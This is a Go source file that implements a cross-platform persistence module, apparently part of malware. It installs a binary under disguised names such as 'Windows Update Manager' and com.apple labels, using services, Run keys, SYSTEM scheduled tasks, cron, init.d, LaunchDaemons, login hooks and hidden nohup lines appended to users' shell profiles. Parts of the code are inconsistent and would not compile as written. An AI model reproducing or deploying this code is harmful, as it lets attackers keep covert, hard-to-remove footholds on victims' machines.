package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"
)

// Persistence, persistence module
type Persistence struct {
	BinaryPath    string
	ServiceName   string
	registryPaths []string
	startupPaths  []string
	cronJobPath   string
}

// New, creates a new persistence object
func New(binaryPath, serviceName string) *Persistence {
	if binaryPath == "" {
		binaryPath = getExecutablePath()
	}

	if serviceName == "" {
		serviceName = "SystemManager"
	}

	p := &Persistence{
		BinaryPath:  binaryPath,
		ServiceName: serviceName,
	}

	// Set persistence paths based on platform
	switch runtime.GOOS {
	case "windows":
		p.registryPaths = []string{
			"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
			"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		}
		p.startupPaths = []string{
			filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
			filepath.Join(os.Getenv("PROGRAMDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
		}
	}

	return p
}

// Install, applies persistence methods based on the operating system
func (p *Persistence) Install() error {
	switch runtime.GOOS {
	case "windows":
		return InstallWindows(p.BinaryPath, p.ServiceName)
	case "linux":
		return InstallLinux(p.BinaryPath, p.ServiceName)
	case "darwin":
		return InstallDarwin(p.BinaryPath, p.ServiceName)
	default:
		return fmt.Errorf("desteklenmeyen platform: %s", runtime.GOOS)
	}
}

func (p *Persistence) InstallWindows() error {
	var successCount int

	// 1. Windows Service installation
	servicePath := filepath.Join(os.Getenv("PROGRAMDATA"), "WindowsUpdate", p.ServiceName+".exe")
	if err := p.copyBinary(servicePath); err == nil {
		// Create service with SC command
		cmd := exec.Command("sc", "create", p.ServiceName, "binPath=", servicePath, "start=", "auto", "DisplayName=", "Windows Update Manager")
		if err := cmd.Run(); err == nil {
			fmt.Println("Windows service installation successful")
			successCount++
		}
	}

	// 2. Registry entries
	for _, regPath := range p.registryPaths {
		cmd := exec.Command("reg", "add", regPath, "/v", p.ServiceName, "/t", "REG_SZ", "/d", servicePath, "/f")
		if err := cmd.Run(); err == nil {
			fmt.Printf("Registry entry successful: %s\n", regPath)
			successCount++
		}
	}

	// 3. Copy to startup folder
	for _, startupPath := range p.startupPaths {
		startupFile := filepath.Join(startupPath, "WindowsUpdate.lnk")
		// Create shortcut
		cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("%s"); $Shortcut.TargetPath = "%s"; $Shortcut.Save()`, startupFile, servicePath))
		if err := cmd.Run(); err == nil {
			fmt.Printf("Shortcut added to startup folder: %s\n", startupFile)
			successCount++
		}
	}

	// 4. Create scheduled task
	taskCmd := exec.Command("schtasks", "/create", "/tn", "WindowsUpdateTask", "/tr", servicePath, "/sc", "onlogon", "/ru", "SYSTEM", "/f")
	if err := taskCmd.Run(); err == nil {
		fmt.Println("Scheduled task created")
		successCount++
	}

	// 5. WMI Event Subscription
	wmiCmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute '%s'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WMIUpdate' -Action $action -Trigger $trigger -RunLevel Highest -Force`, servicePath))
	if err := wmiCmd.Run(); err == nil {
		fmt.Println("WMI Event Subscription created")
		successCount++
	}

	if successCount > 0 {
		return nil
	}
	return fmt.Errorf("no persistence method was successful")
}

func (p *Persistence) InstallLinux() error {
	var successCount int

	// 1. Systemd service installation
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Management Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always

[Install]
WantedBy=multi-user.target
`, p.BinaryPath)

	servicePath := "/etc/systemd/system/" + p.ServiceName + ".service"
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err == nil {
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", p.ServiceName).Run()
		exec.Command("systemctl", "start", p.ServiceName).Run()
		fmt.Println("Systemd service installation successful")
		successCount++
	}

	// 2. Add cron job
	cronJob := fmt.Sprintf("@reboot root %s\n", p.BinaryPath)
	if err := os.WriteFile(p.cronJobPath, []byte(cronJob), 0644); err == nil {
		fmt.Println("Cron job added")
		successCount++
	}

	// 3. Add Init.d script
	initScript := fmt.Sprintf(`#!/bin/sh
### BEGIN INIT INFO
# Provides:          %s
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Management Service
### END INIT INFO

DAEMON="%s"

case "$1" in
  start)
    $DAEMON &
    ;;
  stop)
    killall -9 $(basename $DAEMON)
    ;;
  *)
    echo "Usage: $0 {start|stop}"
    exit 1
    ;;
esac

exit 0
`, p.ServiceName, p.BinaryPath)

	initPath := "/etc/init.d/" + p.ServiceName
	if err := os.WriteFile(initPath, []byte(initScript), 0755); err == nil {
		exec.Command("update-rc.d", p.ServiceName, "defaults").Run()
		fmt.Println("Init.d script added")
		successCount++
	}

	// 4. Add .bashrc and .profile files
	for _, rcFile := range []string{
		filepath.Join(os.Getenv("HOME"), ".bashrc"),
		filepath.Join(os.Getenv("HOME"), ".profile"),
	} {
		if fileExists(rcFile) {
			content, err := os.ReadFile(rcFile)
			if err == nil {
				newContent := string(content)
				if !strings.Contains(newContent, p.BinaryPath) {
					newContent += fmt.Sprintf("\n# System Management\n(nohup %s &>/dev/null &)\n", p.BinaryPath)
					if err := os.WriteFile(rcFile, []byte(newContent), 0644); err == nil {
						fmt.Printf("%s file added\n", rcFile)
						successCount++
					}
				}
			}
		}
	}

	// 5. Create desktop autostart file
	autostartDir := filepath.Join(os.Getenv("HOME"), ".config/autostart")
	if err := os.MkdirAll(autostartDir, 0755); err == nil {
		desktopFile := fmt.Sprintf(`[Desktop Entry]
Type=Application
Name=System Management
Exec=%s
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
`, p.BinaryPath)
		desktopPath := filepath.Join(autostartDir, "system-management.desktop")
		if err := os.WriteFile(desktopPath, []byte(desktopFile), 0644); err == nil {
			fmt.Println("Desktop autostart file created")
			successCount++
		}
	}

	if successCount > 0 {
		return nil
	}
	return fmt.Errorf("no persistence method was successful")
}

func (p *Persistence) InstallDarwin() error {
	var successCount int

	// 1. Create LaunchDaemon
	plistTemplate := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.{{.ServiceName}}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{{.BinaryPath}}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>`

	tmpl, err := template.New("plist").Parse(plistTemplate)
	if err == nil {
		data := struct {
			ServiceName string
			BinaryPath  string
		}{
			ServiceName: p.ServiceName,
			BinaryPath:  p.BinaryPath,
		}

		// Try different LaunchDaemon/LaunchAgent locations
		for _, launchPath := range []string{
			"/Library/LaunchDaemons",
			"/Library/LaunchAgents",
			filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents"),
		} {
			if err := os.MkdirAll(launchPath, 0755); err == nil {
				plistPath := filepath.Join(launchPath, "com.apple."+p.ServiceName+".plist")
				file, err := os.Create(plistPath)
				if err == nil {
					if err := tmpl.Execute(file, data); err == nil {
						file.Close()
						os.Chmod(plistPath, 0644)

						// Load LaunchDaemon/LaunchAgent
						cmd := exec.Command("launchctl", "load", "-w", plistPath)
						if err := cmd.Run(); err == nil {
							fmt.Printf("LaunchDaemon/Agent loaded: %s\n", plistPath)
							successCount++
						}
					}
				}
			}
		}
	}

	// 2. Create login hook
	loginHookDir := "/Library/LoginHook"
	if err := os.MkdirAll(loginHookDir, 0755); err == nil {
		loginHookPath := filepath.Join(loginHookDir, "startup.sh")
		loginHookContent := fmt.Sprintf("#!/bin/sh\n%s &\nexit 0\n", p.BinaryPath)

		if err := os.WriteFile(loginHookPath, []byte(loginHookContent), 0755); err == nil {
			cmd := exec.Command("defaults", "write", "com.apple.loginwindow", "LoginHook", loginHookPath)
			if err := cmd.Run(); err == nil {
				fmt.Println("Login hook created")
				successCount++
			}
		}
	}

	// 3. Add to crontab
	cronCmd := exec.Command("crontab", "-l")
	cronOutput, err := cronCmd.Output()
	if err == nil {
		cronContent := string(cronOutput)
		if !strings.Contains(cronContent, p.BinaryPath) {
			cronContent += fmt.Sprintf("\n@reboot %s\n", p.BinaryPath)
			cronFile, err := os.CreateTemp("", "cron")
			if err == nil {
				defer os.Remove(cronFile.Name())
				if _, err := cronFile.WriteString(cronContent); err == nil {
					cronFile.Close()
					installCmd := exec.Command("crontab", cronFile.Name())
					if err := installCmd.Run(); err == nil {
						fmt.Println("Crontab added")
						successCount++
					}
				}
			}
		}
	}

	// 4. Create RC script
	rcScriptPath := "/Library/StartupItems/SystemManager"
	if err := os.MkdirAll(rcScriptPath, 0755); err == nil {
		scriptContent := fmt.Sprintf(`#!/bin/sh
# SystemManager startup script

. /etc/rc.common

StartService() {
    ConsoleMessage "Starting System Manager"
    "%s" &
}

StopService() {
    ConsoleMessage "Stopping System Manager"
    killall $(basename "%s")
}

RestartService() {
    StopService
    StartService
}

RunService "$1"
`, p.BinaryPath, p.BinaryPath)

		if err := os.WriteFile(filepath.Join(rcScriptPath, "SystemManager"), []byte(scriptContent), 0755); err == nil {
			plistContent := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
    <string>System Management Service</string>
    <key>OrderPreference</key>
    <string>Late</string>
    <key>Provides</key>
    <array>
        <string>SystemManager</string>
    </array>
</dict>
</plist>`

			if err := os.WriteFile(filepath.Join(rcScriptPath, "StartupParameters.plist"), []byte(plistContent), 0644); err == nil {
				fmt.Println("RC script created")
				successCount++
			}
		}
	}

	// 5. Add to shell profile files
	for _, profileFile := range []string{
		filepath.Join(os.Getenv("HOME"), ".bash_profile"),
		filepath.Join(os.Getenv("HOME"), ".zshrc"),
	} {
		if fileExists(profileFile) {
			content, err := os.ReadFile(profileFile)
			if err == nil {
				newContent := string(content)
				if !strings.Contains(newContent, p.BinaryPath) {
					newContent += fmt.Sprintf("\n# System Management\n(nohup %s &>/dev/null &)\n", p.BinaryPath)
					if err := os.WriteFile(profileFile, []byte(newContent), 0644); err == nil {
						fmt.Printf("%s file added\n", profileFile)
						successCount++
					}
				}
			}
		}
	}

	if successCount > 0 {
		return nil
	}
	return fmt.Errorf("no persistence method was successful")
}

func (p *Persistence) copyBinary(destPath string) error {
	if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
		return err
	}

	input, err := os.ReadFile(p.BinaryPath)
	if err != nil {
		return err
	}

	return os.WriteFile(destPath, input, 0755)
}
